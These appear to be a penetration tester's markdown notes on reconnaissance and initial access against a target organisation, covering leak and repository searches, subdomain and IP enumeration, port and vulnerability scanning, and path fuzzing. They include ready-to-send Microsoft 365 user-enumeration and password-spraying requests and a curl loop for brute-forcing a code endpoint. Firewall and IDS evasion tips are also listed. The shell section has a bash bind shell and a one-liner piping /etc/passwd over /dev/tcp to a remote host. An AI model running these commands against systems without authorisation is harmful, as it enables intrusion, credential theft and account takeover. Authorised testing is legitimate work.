# reconnaissance

## Information Gathering - Step 1
- Discover acquisitions
    https://www.crunchbase.com/discover/acquisitions

### search target
- leaks
- social medias (https://www.social-searcher.com/)
- `site:pastebin.com "target"`
- `site:trello.com "target"`
- `site:postman.com "target"`
- authenticated in pastebin
- jira
- buckets: search engine + https://buckets.grayhatwarfare.com/buckets
- search repos
    * `site:github.com "target"`
    * `site:gitlab.com "target"`
    * https://github.com/search?q=target&type=code
#### check repos 
* manually
* https://github.com/gitleaks/gitleaks
* `trufflehog github --org=TARGET --only-verified --include-members --token github_...`

## Information Gathering - Step 2

- get initial domains:
    * search engine + links in main websites
    * save different registrants to search: 
        * registrant email in search engines
        * https://viewdns.info/reversewhois/
        * https://ti.defender.microsoft.com/
            - use wildcard to search
        * security trails (soa records)
    * host.io
    * searchdns.netcraft.com
    * search relations
        * https://builtwith.com/relationships/example.com
    * zone files: https://czds.icann.org/
        * ?https://opendata.rapid7.com/sonar.fdns_v2/
    * ?whoxy.com
    * ?search target cnpjs
    * ?robtex.com
- domains with other suffixes: 
    * `curl -s 'https://publicsuffix.org/list/public_suffix_list.dat' | grep -vE '^//' | sort -u | parallel -j 100 --results ~/project/curl/{} curl -si TARGET.{}`

- get subdomains: 
    * [subdomains.sh](subdomains.sh)
        * https://ti.defender.microsoft.com/
        * security trails
        * subfinder
        * amass
        * crt
        * theHarvester
    * https://developers.facebook.com/tools/ct
    * dnsdumpster.com
    * https://subdomains.whoisxmlapi.com
    * brute dns: recon-ng, gobuster, dnsrecon
    * zone transfer
        * dnsrecon -d example.com -t axfr
        * can affect just one ns of the target
        * host -l example.com ns.example.com
        * host -t AXFR example.com ns2.example.com
        * dig -t AXFR example.com @ns.example.com +short 
        * ?eldraco/domain_analyzer
        
- get ips:
    - shodan (hostname:example.com)
    - search.censys.io
    - recon-ng
    - search netblocks / ASN using known hosts
    - search netblocks / ASN via target name
        - https://bgp.he.net/
        - https://bgpview.io/
    - passivedns.mnemonic.no
    - ip address history
        - https://builtwith.com/relationships/example.com
        - https://ti.defender.microsoft.com/search/data/resolutions?query=example.com
        - passivedns.mnemonic.no
        - shodan
        - censys

- reverse dns lookup:
    * manual: host -t ptr IP 
    * prips RANGE_IP | hakrevdns
        - https://github.com/hakluke/hakrevdns
    * passivedns.mnemonic.no
    * recon-ng: reverse_resolve
    * tab DNS from https://bgp.he.net/net/{NETBLOCK}
    * bing ip:"1.1.1.1"
        - recon-ng
        - ?theharvester

## MS365
- [gather emails](web.md#gathering-users-emails-cpfs)
- password leaks: dehashed, scylla.so, breachdirectory.org, HIBP, pastebin, google
- user enumeration (0,5,6 indicate the user is valid)
```http
POST /common/GetCredentialType?mkt=en HTTP/1.1
Host: login.microsoftonline.com
User-Agent: ...
Content-type: application/json; charset=UTF-8
Accept: application/json
Origin: https://login.microsoftonline.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: en,pt-BR;q=0.9,pt;q=0.8,en-US;q=0.7

{"username":"user@domain.tld"}
```

- password spraying + user enumeration
```http
POST /common/oauth2/token HTTP/1.1
Host: login.microsoftonline.com
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Connection: close

resource=https%3A%2F%2Fgraph.windows.net&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&client_info=1&grant_type=password&username=username%40domain.tld&password=Password1&scope=openid
```

### post
- vpn
- admin center
- portal azure (portal.azure.com)
- outlook, teams

## Scanning
- brute s3 buckets (`gobuster s3 -k --wordlist subdomains.txt`)
- subdomain takeover
    - dnsreaper
    - [subdomains.sh](subdomains.sh)
    - look for:
        * amazonaws.com
        * cloudapp.net (azure)
        * azurewebsites.net
        * myshopify.com
        * github.io
        * herokuapp.com
        * cloudfront.net
        * home.blog (wordpress)
    - https://0xpatrik.com/subdomain-takeover-basics/ 
    1) search CNAMEs pointing to available domains or services
    2) search NS and MX's domains available

- get web services
    * `httpx -p http:80,8080,8000,8008,8888,9090,https:443,8443 -l hosts.txt -o web.txt`
- web screenshots
    * `gowitness file -f web.txt --user-agent "x" --debug ; gowitness server`
- port scan
    * short scan
        - `nmap -sS -Pn -n -v3 --open -iL hosts.txt -oG nmap.short.tcp.txt -p 21,22,23,445,2049,3306,3389,5900` 
    * full tcp scan
        - `naabu -Pn -exclude-cdn -exclude-ports 80,443 -list ips.txt -o naabu.full.tcp.txt -p -`
        - `masscan -p 0-79,81-442,444-65535 -iL ips.txt -oG masscan.full.tcp.txt --open #--resume paused.conf`
    * udp scan
        - `nmap -sUV -Pn -vv --top-ports 10 --open -iL hosts.txt -oG nmap.udp.out`
### vulnerability scan
- nessus
#### nuclei
- base: `nuclei -l subdomains.txt -H "User-Agent: X" -o nuclei.APPROACH.results.txt -retries 3` 
- breadth-first: `-rate-limit 1500 -bulk-size 125 -concurrency 5 #-resume resume-file.cfg`
- approaches
1) sniper
```sh
-t http/miscellaneous/directory-listing.yaml \
-t http/exposures/configs/phpinfo-files.yaml \
-t http/exposures/apis/swagger-api.yaml \
-t http/exposures/apis/wadl-api.yaml \
-t http/exposures/apis/wsdl-api.yaml \
-t http/exposures/configs/laravel-env.yaml \
-t http/misconfiguration/aws/aws-object-listing.yaml \
-t http/misconfiguration/glpi-directory-listing.yaml \
-t http/misconfiguration/springboot \
-t http/exposures/logs \
-t http/takeovers \
-t dns \
-t cloud
```
2) new
`-new-templates`
3) gold
`-exclude-severity info -etags cve,wordpress,wp-plugin,tech,ssl`
4) underground
5) reverse sniper

## Content discovery
- fuzzing web paths
    - ? `nmap --script=http-enum -iL web.txt -p80,443`
    - `for url in $(cat web.txt); do ffuf -H 'User-Agent: x' -c -recursion -recursion-depth 5 -w ../wordlist.txt -u $url/FUZZ -o "$(echo $url | sed 's/^http[s]\?...//' | sed 's/\///g')".ffuf.json ; done`
    - `cat site.ffuf.json | jq '.results | sort_by(.length) | .[]' | jq -C '{"length","status","words","lines","content-type","url"} | select (.status != 403)' | less -R`

## Intruder Alternatives
- curl + parallel: `seq -f '%04g' 1000 9999 | parallel -j 100 --results 'curl_output/{1}' curl --path-as-is -i -s -k -X 'POST' -H "'Content-Type: application/x-www-form-urlencoded'" -H "'User-Agent: Mozilla...'" --data-binary "'code={1}'" "'https://target.com/api/checkcode'"`

## techniques against inbound network firewall
* ipv6
* set a source port
    * nmap --source-port 53
    * nc -p 53
* if internal: spoof mac
* if rce: remote port forwarding
* ?spoof ip

- bypass IDS/IPS: send ip spoofed packets with the true
    * ex: nmap -D RND:30

- traceroute to understand firewall (try traceroute udp & tcp with different ports, icmp)


## exploitation
- identify service version
    - nmap
    - manual approach
- search for exploits
    * https://www.exploit-db.com (or searchsploit)
    * github (search cve)
    * google
    * https://packetstormsecurity.com

- check default credentials
    - https://cirt.net/passwords 
    - https://open-sez.me/

- password spraying
    - Company@Year
    - o365spray
    - if found cred, try in vpn


### email
- SPF: identify servers allowed to send emails on behalf of the domain, should be configured with "-all" or use DMARC
    - "~all" can cause softfail, DMARC interprets SPF Softfail as a 'Pass' or 'Fail' depending on its email server settings
- host -t txt example.com

- DMARC policies
- Monitor, also called none policy, is the most basic DMARC policy and specified by “p=none.” The monitor enables monitoring and sends all emails (including failed authentication) to maintain regular traffic flow.
- Quarantine: The quarantine policy is specified by “p=quarantine,” which sends unqualified emails (those that fail authentication) to the recipient’s trash or spam folder. 
- Reject: The Reject policy prevents unqualified emails (those with failed authentication) from reaching their intended recipient. The reject policy, specified by “p=reject”.
- host -t txt _dmarc.example.com
    * https://emkei.cz/
    * ?sendgrid
- https://dmarcreport.com/content/spf-authentication-fails/

## shell
* netcat can be used with metasploit inline payloads
* socat, netcat alternative:
    * socat tcp4-listen:8080 EXEC:/bin/bash
    * socat - tcp4:duck.com:80

* bash native support to reverse shell: /dev/protocol/host/port
    * cat /etc/passwd >/dev/tcp/host/port

* encrypted shell is better to avoid detection
    * ncat has encryption support
    * openssl s_client -connect example.com:443

* upgrading shell
```bash
stty raw -echo
nc -lvp 1234
python -c 'import pty; pty.spawn("/bin/bash")'
```

### techniques against outbound network firewall
* try popular ports (443/tcp, 80/tcp, 53/udp, 22/tcp)
* ipv6
* if rce: 
    - dnscat2
    - write output in a public directory (web server, smb, ...) in the file system
* ?non tcp/udp protocols (icmp)


## phishing
- urlcrazy: look for domains to use in phishing attacks
